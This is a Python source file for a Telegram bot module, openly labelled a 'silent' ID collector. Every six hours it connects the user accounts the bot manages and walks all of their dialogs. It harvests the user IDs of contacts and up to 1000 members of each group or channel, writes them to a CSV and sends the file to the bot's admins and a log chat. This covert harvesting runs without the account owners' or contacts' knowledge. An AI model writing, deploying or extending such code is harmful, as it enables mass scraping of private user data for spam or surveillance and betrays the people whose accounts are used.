"""Silent Telegram ID collector from all user dialogs"""
import asyncio
import csv
import logging
import os
from datetime import datetime
from pathlib import Path
from typing import Set
from telethon.tl.types import User, Chat, Channel

logger = logging.getLogger(__name__)

class IDCollector:
    """Silently collects Telegram IDs from all managed accounts"""
    
    def __init__(self, bot, account_manager):
        self.bot = bot
        self.account_manager = account_manager
        self.collected_ids: Set[int] = set()
        self.running = False
        
    async def start(self):
        """Start ID collection worker"""
        self.running = True
        logger.info("ID Collector started - will run every 6 hours")
        asyncio.create_task(self._collection_loop())
        
    async def stop(self):
        """Stop ID collection worker"""
        self.running = False
        logger.info("ID Collector stopped")
        
    async def _collection_loop(self):
        """Main collection loop - runs every 6 hours"""
        while self.running:
            try:
                logger.info("Waiting 6 hours for next ID collection cycle...")
                await asyncio.sleep(21600)  # 6 hours
                logger.info("Starting scheduled ID collection")
                await self.collect_all_ids()
            except Exception as e:
                logger.error(f"ID collection error: {e}")
                
    async def collect_all_ids(self):
        """Collect IDs from all managed accounts"""
        logger.info("=" * 50)
        logger.info("Starting ID collection process")
        self.collected_ids.clear()
        
        if not hasattr(self.account_manager, 'user_clients'):
            logger.warning("No user clients available for collection")
            await self._send_log("⚠️ No user clients available for ID collection")
            return
        
        total_accounts = sum(len(clients) for clients in self.account_manager.user_clients.values())
        logger.info(f"Found {total_accounts} accounts to scan")
        await self._send_log(f"🔍 Starting ID collection from {total_accounts} accounts")
        
        account_count = 0
        for user_id, clients in self.account_manager.user_clients.items():
            for account_name, client in clients.items():
                account_count += 1
                try:
                    logger.info(f"[{account_count}/{total_accounts}] Collecting from account: {account_name}")
                    if not client.is_connected():
                        logger.info(f"  Connecting client for {account_name}...")
                        await client.connect()
                    await self._collect_from_client(client, account_name)
                    logger.info(f"  ✓ Completed {account_name} - Total IDs: {len(self.collected_ids):,}")
                except Exception as e:
                    logger.error(f"  ✗ Collection failed for {account_name}: {e}")
        
        logger.info(f"Collection complete - Total unique IDs: {len(self.collected_ids):,}")
        await self._save_and_send()
        logger.info("=" * 50)
        
    async def _collect_from_client(self, client, account_name: str):
        """Collect user IDs from a single client's dialogs (stays offline)"""
        dialog_count = 0
        entity_ids = 0
        participant_ids = 0
        
        try:
            async for dialog in client.iter_dialogs(limit=None):
                dialog_count += 1
                entity = dialog.entity
                
                # Collect entity IDs
                if isinstance(entity, User):
                    self.collected_ids.add(entity.id)
                    entity_ids += 1
                    
                # Collect participant IDs from groups/channels
                if isinstance(entity, (Chat, Channel)) and hasattr(entity, 'participants_count'):
                    try:
                        before_count = len(self.collected_ids)
                        async for participant in client.iter_participants(entity, limit=1000):
                            if isinstance(participant, User):
                                self.collected_ids.add(participant.id)
                        added = len(self.collected_ids) - before_count
                        participant_ids += added
                        if added > 0:
                            logger.info(f"    Collected {added} IDs from {dialog.name or 'Unknown'}")
                    except Exception as e:
                        logger.debug(f"    Failed to get participants from {dialog.name or 'Unknown'}: {e}")
            
            logger.info(f"  Scanned {dialog_count} dialogs: {entity_ids} direct + {participant_ids} participants")
        except Exception as e:
            logger.error(f"Dialog iteration error for {account_name}: {e}")
            await self._send_log(f"⚠️ Collection error for {account_name}: {e}")
            
    async def _save_and_send(self):
        """Save collected IDs to CSV and send to admins and logs bot"""
        if not self.collected_ids:
            logger.warning("No IDs collected, skipping save/send")
            await self._send_log("⚠️ No IDs collected")
            return
        
        logger.info(f"Saving {len(self.collected_ids):,} IDs to CSV...")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"telegram_ids_{timestamp}.csv"
        filepath = Path(filename)
        
        try:
            # Write to CSV
            with open(filepath, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['user_id', 'collected_at'])
                for user_id in sorted(self.collected_ids):
                    writer.writerow([user_id, timestamp])
            
            logger.info(f"✓ CSV file created: {filename} ({filepath.stat().st_size} bytes)")
            
            caption = f"📊 Collected {len(self.collected_ids):,} Telegram IDs\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Send to admins
            from ..core.config import ADMIN_IDS
            logger.info(f"Sending to {len(ADMIN_IDS)} admin(s)...")
            
            for admin_id in ADMIN_IDS:
                try:
                    await self.bot.send_file(admin_id, filepath, caption=caption)
                    logger.info(f"  ✓ Sent to admin {admin_id}")
                except Exception as e:
                    logger.error(f"  ✗ Failed to send to admin {admin_id}: {e}")
            
            # Send to logs bot
            await self._send_to_logs_bot(filepath, caption)
            
            # Cleanup
            filepath.unlink(missing_ok=True)
            logger.info(f"✓ Cleanup complete - CSV file removed")
            logger.info(f"SUCCESS: Collected and sent {len(self.collected_ids):,} IDs to admins")
            
            # Send success log
            await self._send_log(f"✅ ID Collection Success: {len(self.collected_ids):,} IDs collected and sent")
            
        except Exception as e:
            logger.error(f"Failed to save/send IDs: {e}")
            await self._send_log(f"❌ ID Collection Failed: {e}")
            if filepath.exists():
                filepath.unlink(missing_ok=True)
    
    async def _send_to_logs_bot(self, filepath: Path, caption: str):
        """Send CSV file to logs bot if configured"""
        try:
            log_chat_id = os.getenv('LOG_CHAT_ID')
            if not log_chat_id:
                return
            
            await self.bot.send_file(int(log_chat_id), filepath, caption=caption)
            logger.info(f"  ✓ Sent to logs bot {log_chat_id}")
        except Exception as e:
            logger.debug(f"Failed to send to logs bot: {e}")
    
    async def _send_log(self, message: str):
        """Send log message to logs bot if configured"""
        try:
            log_chat_id = os.getenv('LOG_CHAT_ID')
            if not log_chat_id:
                return
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_message = f"📊 **ID Collector Log**\n🕐 {timestamp}\n\n{message}"
            await self.bot.send_message(int(log_chat_id), log_message)
        except Exception as e:
            logger.debug(f"Failed to send log message: {e}")
